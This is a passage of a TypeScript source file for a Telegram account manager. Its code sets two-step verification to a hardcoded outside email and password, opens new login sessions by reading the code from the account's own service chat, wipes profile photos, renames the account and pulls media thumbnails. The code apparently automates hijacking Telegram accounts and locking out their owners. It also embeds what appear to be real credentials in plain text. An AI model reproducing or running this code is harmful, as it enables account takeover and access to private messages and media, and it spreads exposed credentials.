                    }
                    console.warn(`Username attempt failed: ${parsedError.message}`);
                }

                username = `${baseUsername}${++increment}`;
                await sleep(2000);
            }

            return newUserName;
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error updating username:', parsedError);
            throw error;
        }
    }

    public async updatePrivacy(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        const privacySettings = [
            {
                key: new Api.InputPrivacyKeyPhoneCall(),
                rules: [new Api.InputPrivacyValueDisallowAll()]
            },
            {
                key: new Api.InputPrivacyKeyProfilePhoto(),
                rules: [new Api.InputPrivacyValueAllowAll()]
            },
            {
                key: new Api.InputPrivacyKeyForwards(),
                rules: [new Api.InputPrivacyValueAllowAll()]
            },
            {
                key: new Api.InputPrivacyKeyPhoneNumber(),
                rules: [new Api.InputPrivacyValueDisallowAll()]
            },
            {
                key: new Api.InputPrivacyKeyStatusTimestamp(),
                rules: [new Api.InputPrivacyValueAllowAll()]
            },
            {
                key: new Api.InputPrivacyKeyAbout(),
                rules: [new Api.InputPrivacyValueAllowAll()]
            }
        ];

        try {
            for (const setting of privacySettings) {
                await this.retryOperation(() =>
                    this.client!.invoke(
                        new Api.account.SetPrivacy({
                            key: setting.key,
                            rules: setting.rules
                        })
                    )
                );
                console.log(`Updated privacy for ${setting.key.className}`);
            }
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error updating privacy settings:', parsedError);
            throw error;
        }
    }

    public async getFileUrl(url: string, filename: string): Promise<string> {
        const filePath = `/tmp/${filename}`;
        return this.safeOperation({
            execute: async () => {
                const response = await axios.get(url, {
                    responseType: 'stream',
                    timeout: 30000,
                    maxContentLength: TelegramManager.MAX_FILE_SIZE
                });

                await new Promise<void>((resolve, reject) => {
                    const writer = fs.createWriteStream(filePath);
                    response.data.pipe(writer);
                    writer.on('finish', resolve);
                    writer.on('error', reject);
                });

                return filePath;
            },
            cleanup: async () => {
                try {
                    if (fs.existsSync(filePath)) {
                        fs.unlinkSync(filePath);
                    }
                } catch (error) {
                    console.warn(`Failed to cleanup file ${filePath}:`, parseError(error));
                }
            }
        });
    }

    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        let filePath: string | null = null;
        try {
            filePath = await this.getFileUrl(url, filename);
            const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
            await this.client.sendFile(id, { file, caption });
        } finally {
            if (filePath && fs.existsSync(filePath)) {
                try {
                    fs.unlinkSync(filePath);
                } catch (error) {
                    console.warn(`Failed to cleanup file ${filePath}:`, parseError(error));
                }
            }
        }
    }

    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        let filePath: string | null = null;
        try {
            filePath = await this.getFileUrl(url, filename);
            const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
            await this.client.sendFile(id, { file, caption });
        } finally {
            if (filePath && fs.existsSync(filePath)) {
                try {
                    fs.unlinkSync(filePath);
                } catch (error) {
                    console.warn(`Failed to cleanup file ${filePath}:`, parseError(error));
                }
            }
        }
    }

    public async updateProfilePic(imagePath: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        let shouldDeleteFile = false;

        try {
            if (imagePath.startsWith('http')) {
                const tempFile = await this.getFileUrl(imagePath, 'profile.jpg');
                imagePath = tempFile;
                shouldDeleteFile = true;
            }

            const fileStats = fs.statSync(imagePath);
            const file = new CustomFile('pic.jpg', fileStats.size, imagePath);

            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1,
            });

            await this.client.invoke(new Api.photos.UploadProfilePhoto({
                file: uploadedFile,
            }));

        } finally {
            if (shouldDeleteFile && fs.existsSync(imagePath)) {
                try {
                    fs.unlinkSync(imagePath);
                } catch (error) {
                    console.warn(`Failed to cleanup file ${imagePath}:`, parseError(error));
                }
            }
        }
    }

    async hasPassword() {
        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async set2fa() {
        return this.safeOperation({
            execute: async () => {
                const hasPassword = await this.hasPassword();
                if (hasPassword) {
                    console.log("Password already exists");
                    return;
                }

                console.log("Password Does not exist, Setting 2FA");

                const imapService = MailReader.getInstance();
                const twoFaDetails = {
                    email: "storeslaksmi@gmail.com",
                    hint: "password - India143",
                    newPassword: "Ajtdmwajt1@",
                };

                await imapService.connectToMail();

                return new Promise((resolve, reject) => {
                    const maxRetries = 3;
                    let retryCount = 0;
                    const checkTimeout = 30000; // 30 seconds timeout
                    const startTime = Date.now();

                    const checkMailInterval = setInterval(async () => {
                        try {
                            if (Date.now() - startTime > checkTimeout) {
                                clearInterval(checkMailInterval);
                                await imapService.disconnectFromMail();
                                reject(new Error("2FA setup timeout"));
                                return;
                            }

                            if (imapService.isMailReady()) {
                                clearInterval(checkMailInterval);
                                await this.setup2faWithEmail(imapService, twoFaDetails);
                                resolve(twoFaDetails);
                            } else if (++retryCount >= maxRetries) {
                                clearInterval(checkMailInterval);
                                await imapService.disconnectFromMail();
                                reject(new Error("Mail service connection timeout"));
                            }
                        } catch (error) {
                            clearInterval(checkMailInterval);
                            await imapService.disconnectFromMail();
                            reject(error);
                        }
                    }, 5000);
                });
            }
        });
    }

    private async setup2faWithEmail(
        imapService: MailReader,
        twoFaDetails: { email: string; hint: string; newPassword: string }
    ): Promise<void> {
        await this.client!.updateTwoFaSettings({
            isCheckPassword: false,
            email: twoFaDetails.email,
            hint: twoFaDetails.hint,
            newPassword: twoFaDetails.newPassword,
            emailCodeCallback: async () => {
                return this.waitForEmailCode(imapService);
            },
            onEmailCodeError: (error) => {
                console.error('Email code error:', parseError(error));
                return Promise.resolve("error");
            }
        });
    }

    private async waitForEmailCode(imapService: MailReader): Promise<string> {
        const maxAttempts = 4;
        const checkInterval = 10000;

        return new Promise<string>(async (resolve, reject) => {
            let attempts = 0;

            const checkCode = async () => {
                try {
                    if (attempts >= maxAttempts) {
                        await imapService.disconnectFromMail();
                        reject(new Error("Failed to retrieve code after maximum attempts"));
                        return;
                    }

                    if (imapService.isMailReady()) {
                        const code = await imapService.getCode();
                        if (code) {
                            await imapService.disconnectFromMail();
                            resolve(code);
                            return;
                        }
                    }

                    attempts++;
                    setTimeout(checkCode, checkInterval);
                } catch (error) {
                    await imapService.disconnectFromMail();
                    reject(error);
                }
            };

            checkCode();
        });
    }

    public async createNewSession(): Promise<string> {
        return this.safeOperation({
            execute: async () => {
                const me = await this.client!.getMe() as Api.User;
                if (!me.phone) throw new Error('Failed to get phone number');

                const newClient = new TelegramClient(
                    new StringSession(''),
                    parseInt(process.env.API_ID || '', 10),
                    process.env.API_HASH || '',
                    {
                        connectionRetries: 1,
                        timeout: 30000
                    }
                );

                await newClient.start({
                    phoneNumber: me.phone,
                    password: async () => "Ajtdmwajt1@",
                    phoneCode: async () => {
                        console.log('Waiting for the OTP code from chat ID 777000...');
                        const code = await this.waitForOtp();
                        if (!code) throw new Error('Failed to get OTP code');
                        return code;
                    },
                    onError: (err: any) => {
                        const parsedError = parseError(err);
                        throw new Error(`Session creation failed: ${parsedError.message}`);
                    }
                });

                const session = newClient.session.save() as unknown as string;
                await newClient.disconnect();
                return session;
            }
        });
    }

    public async waitForOtp(): Promise<string> {
        const maxAttempts = 3;
        const checkInterval = 5000;
        const messageValidityWindow = 60000; // 1 minute

        for (let attempt = 0; attempt < maxAttempts; attempt++) {
            try {
                const messages = await this.retryOperation(
                    () => this.client!.getMessages('777000', { limit: 1 }),
                    2
                );

                const message = messages[0];
                if (!message) {
                    console.log("No messages found");
                    continue;
                }

                const isRecent = message.date * 1000 > Date.now() - messageValidityWindow;
                const code = this.extractOtpFromMessage(message.text);

                if (!code) {
                    console.log("Invalid message format");
                    continue;
                }

                if (isRecent || attempt === maxAttempts - 1) {
                    console.log("Using code:", code);
                    return code;
                }

                console.log("Message too old:", new Date(message.date * 1000).toISOString());
                await sleep(checkInterval);
            } catch (error) {
                const parsedError = parseError(error);
                console.warn(`OTP attempt ${attempt + 1} failed:`, parsedError);
                if (attempt < maxAttempts - 1) {
                    await sleep(2000 * (attempt + 1));
                }
            }
        }

        throw new Error('Failed to get OTP after maximum attempts');
    }

    private extractOtpFromMessage(text: string): string | null {
        try {
            const match = text.split('.')[0].split("code:**")[1]?.trim();
            return match || null;
        } catch {
            return null;
        }
    }

    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {
        return Promise.race([
            promise,
            new Promise<T>((_, reject) =>
                setTimeout(() => reject(new Error('Download timeout')), timeout)
            )
        ]);
    }

    private async retryOperation<T>(
        operation: () => Promise<T>,
        retries: number = TelegramManager.MAX_RETRIES
    ): Promise<T> {
        for (let i = 0; i < retries; i++) {
            try {
                return await operation();
            } catch (error) {
                if (i === retries - 1) throw error;
                const parsedError = parseError(error);
                if (parsedError.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(parsedError.message.match(/FLOOD_WAIT_(\d+)/)?.[1] || '30', 10);
                    await sleep(waitTime * 1000);
                } else {
                    await sleep(2000 * (i + 1)); // Exponential backoff
                }
            }
        }
        throw new Error('Operation failed after max retries');
    }

    private async safeOperation<T>({ execute, cleanup }: TelegramOperation<T>): Promise<T> {
        if (!this.client) {
            throw new Error('Client is not initialized');
        }

        try {
            return await execute();
        } catch (error) {
            const parsedError = parseError(error);
            if (parsedError.message.includes(TelegramErrorCode.FLOOD_WAIT)) {
                const waitTime = parseInt(parsedError.message.match(/FLOOD_WAIT_(\d+)/)?.[1] || '30', 10);
                await sleep(waitTime * 1000);
                return await execute();
            }
            throw error;
        } finally {
            if (cleanup) {
                try {
                    await cleanup();
                } catch (cleanupError) {
                    console.warn('Cleanup failed:', parseError(cleanupError));
                }
            }
        }
    }

    public async deleteProfilePhotos(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );

            console.log(`Profile pictures found: ${result.photos.length}`);

            if (result?.photos?.length > 0) {
                await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: result.photos.map(photo => new Api.InputPhoto({
                            id: photo.id,
                            accessHash: (photo as Api.Photo).accessHash,
                            fileReference: (photo as Api.Photo).fileReference
                        }))
                    })
                );
                console.log("Deleted profile photos");
            }
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error deleting profile photos:', parsedError);
            throw error;
        }
    }

    public async getMediaMetadata(
        chatId: string = 'me',
        offset?: number,
        limit = 100
    ): Promise<{ data: MediaMessageMetadata[]; endOfMessages: boolean }> {
        return this.safeOperation({
            execute: async () => {
                const query: { limit: number; offsetId?: number } = { limit };
                if (offset) query.offsetId = offset;

                const messages = await this.client!.getMessages(chatId, query);
                const mediaMessages = messages.filter(message =>
                    message.media && message.media.className !== "MessageMediaWebPage"
                );

                console.log(`Total: ${messages.total}, fetched: ${messages.length}, ChatId: ${chatId}, Media: ${mediaMessages.length}`);

                if (!messages.length) {
                    return { data: [], endOfMessages: true };
                }

                const data: MediaMessageMetadata[] = [];
                const processPromises = mediaMessages.map(async message => {
                    try {
                        const thumbBuffer = await this.getMediaThumbnail(message);
                        return {
                            messageId: message.id,
                            mediaType: message.media instanceof Api.MessageMediaPhoto ? 'photo' as const : 'video' as const,
                            thumb: thumbBuffer?.toString('base64') || null,
                        };
                    } catch (error) {
                        console.warn(`Failed to process message ${message.id}:`, parseError(error));
                        return {
                            messageId: message.id,
                            mediaType: message.media instanceof Api.MessageMediaPhoto ? 'photo' as const : 'video' as const,
                            thumb: null,
                        };
                    }
                });

                const results = await Promise.allSettled(processPromises);
                results.forEach(result => {
                    if (result.status === 'fulfilled') {
                        data.push(result.value);
                    }
                });

                if (!data.length && messages.length > 0) {
                    data.push({
                        messageId: messages[messages.length - 1].id,
                        mediaType: 'photo',
                        thumb: null,
                    });
                }

                return { data, endOfMessages: false };
            }
        });
    }

    private async getMediaThumbnail(message: Api.Message): Promise<Buffer | null> {
        if (message.media instanceof Api.MessageMediaPhoto) {
            const sizes = (message.photo as Api.Photo)?.sizes || [1];
            return this.downloadWithTimeout(
                this.client!.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as Promise<Buffer>,
                TelegramManager.DOWNLOAD_TIMEOUT
            );
        } else if (
            message.media instanceof Api.MessageMediaDocument &&
            message.document?.mimeType &&
            (message.document.mimeType.startsWith('video') || message.document.mimeType.startsWith('image'))
        ) {
            const sizes = message.document?.thumbs || [1];
            return this.downloadWithTimeout(
                this.client!.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as Promise<Buffer>,
                TelegramManager.DOWNLOAD_TIMEOUT
            );
        }
        return null;
    }
}
export default TelegramManager;
